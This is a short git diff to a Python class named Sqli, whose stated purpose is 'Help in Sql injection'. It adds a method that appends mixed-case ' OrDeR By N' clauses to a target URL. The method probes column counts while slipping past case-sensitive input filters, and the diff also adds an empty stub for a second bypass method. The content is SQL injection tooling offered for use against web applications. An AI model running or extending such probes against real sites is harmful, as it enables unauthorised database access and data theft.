@@ -4,6 +4,7 @@ from bs4 import BeautifulSoup
 import os
 
 class Sqli:
+    
     __version__ = '0.47'
     __author__ = 'tHe GhOsT'
     __purpose__ = 'Help in Sql injection.... for {}'.format(__author__)
@@ -65,6 +66,20 @@ class Sqli:
         for e in range(1,ending_column+1):
             send = str(str(url)+' order by '+str(e))
             self.order_by_browser(send)
+    
+    def OrderByBypass1(self, url, ending_column):
+        bypassMethod = ' OrDeR By '
+        for e in range(1, ending_column):
+            send = str(str(url+bypassMethod+str(e)))
+            self.order_by_browser(send)
+    
+    def OrderByBypass2(self, url, ending_column):
+        pass
+
+
+
+
+
 
 
 
